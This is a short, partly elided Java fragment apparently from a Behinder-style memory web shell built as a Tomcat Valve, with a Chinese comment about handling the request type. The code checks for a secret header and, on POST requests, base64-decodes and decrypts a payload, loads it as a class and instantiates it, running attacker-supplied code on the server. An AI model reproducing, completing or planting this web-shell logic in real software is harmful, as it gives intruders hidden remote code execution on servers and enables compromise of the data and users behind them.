        ...
        try {
            ...
            if (request.getHeader(randomHeader).equals(randomHeader)) {
                ...
                if (request.getMethod().equals("POST")) {
                    ...
                    // valve这里的request不是RequestFacade 捕获类型转换异常
                    try {
                    ...
                    (new BehinderValve(this.getClass().getClassLoader())).g(c.doFinal(this.base64Decode(payload))).newInstance().equals(pageContext);
                }
                return;
            }
        } catch (Exception e) {
